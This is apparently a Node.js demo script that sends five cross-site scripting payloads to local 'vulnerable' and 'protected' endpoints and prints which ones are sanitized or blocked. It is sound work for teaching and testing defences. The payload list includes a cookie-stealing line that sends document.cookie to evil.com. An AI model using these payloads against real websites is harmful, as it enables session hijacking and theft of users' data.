const http = require('http');

const RESET = '\x1b[0m';
const RED = '\x1b[31m';
const GREEN = '\x1b[32m';
const YELLOW = '\x1b[33m';
const CYAN = '\x1b[36m';
const BOLD = '\x1b[1m';

const TARGETS = {
    vulnerable: new URL('http://localhost:5000/api/xss/vulnerable'),
    protected: new URL('http://localhost:5000/api/xss/protected'),
};

const PAYLOADS = [
    { payload: "<script>alert('XSS')</script>", type: 'stored' },
    { payload: '<img src=x onerror=alert(document.cookie)>', type: 'reflected' },
    { payload: 'javascript:void(document.cookie)', type: 'dom' },
    { payload: "<iframe src='javascript:alert(1)'></iframe>", type: 'stored' },
    { payload: "<svg onload=fetch('http://evil.com?c='+document.cookie)>", type: 'dom' },
];

const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function requestJson(url, body) {
    const payload = JSON.stringify(body);
    const options = {
        protocol: url.protocol,
        hostname: url.hostname,
        port: url.port,
        path: url.pathname,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-Forwarded-For': '10.0.0.66',
            'Content-Length': Buffer.byteLength(payload),
        },
    };

    const client = url.protocol === 'https:' ? require('https') : http;

    return new Promise((resolve, reject) => {
        const req = client.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => { data += chunk; });
            res.on('end', () => {
                try {
                    resolve({ statusCode: res.statusCode, body: JSON.parse(data) });
                } catch {
                    resolve({ statusCode: res.statusCode, body: data });
                }
            });
        });

        req.on('error', reject);
        req.write(payload);
        req.end();
    });
}

function renderComparisonRow(label, vulnerableResponse, protectedResponse) {
    const vulnerableFlag = vulnerableResponse.body?.detected === true || vulnerableResponse.body?.safe === false;
    const protectedFlag = protectedResponse.body?.blocked === true || protectedResponse.body?.sanitizationApplied === true;

    const vulnerableText = vulnerableResponse.statusCode === 200
        ? `${RED}${vulnerableFlag ? 'VULNERABLE' : 'SAFE'}${RESET}`
        : `${RED}${vulnerableResponse.statusCode}${RESET}`;
    const protectedText = protectedResponse.statusCode === 200
        ? `${GREEN}${protectedFlag ? 'PROTECTED' : 'SANITIZED'}${RESET}`
        : `${RED}${protectedResponse.statusCode}${RESET}`;

    console.log(`${CYAN}${label.padEnd(36)}${RESET} ${vulnerableText.padEnd(24)} ${protectedText}`);

    if (vulnerableResponse.body) {
        console.log(`  vulnerable -> detected=${String(vulnerableResponse.body.detected)} safe=${String(vulnerableResponse.body.safe)}`);
    }
    if (protectedResponse.body) {
        console.log(`  protected  -> blocked=${String(protectedResponse.body.blocked)} sanitized=${String(protectedResponse.body.sanitizationApplied)}`);
    }
}

async function main() {
    console.log(`${BOLD}${YELLOW}XSS ATTACK DEMO${RESET}`);
    console.log(`${CYAN}${'Payload'.padEnd(36)}${RESET} ${CYAN}${'Vulnerable'.padEnd(24)}${RESET} ${CYAN}Protected${RESET}`);
    console.log(`${'-'.repeat(36)} ${'-'.repeat(24)} ${'-'.repeat(24)}`);

    for (let i = 0; i < PAYLOADS.length; i += 1) {
        const payload = PAYLOADS[i];

        const requestBody = { input: payload.payload, type: payload.type };
        const vulnerableResponse = await requestJson(TARGETS.vulnerable, requestBody);
        const protectedResponse = await requestJson(TARGETS.protected, requestBody);

        renderComparisonRow(`Payload ${i + 1}`, vulnerableResponse, protectedResponse);

        if (i < PAYLOADS.length - 1) {
            await wait(500);
        }
    }

    console.log(`${YELLOW}VULNERABLE endpoint reflects unescaped input; PROTECTED endpoint sanitizes and blocks.${RESET}`);
}

main().catch((error) => {
    console.error(`${RED}[FATAL] ${error.message}${RESET}`);
    process.exit(1);
});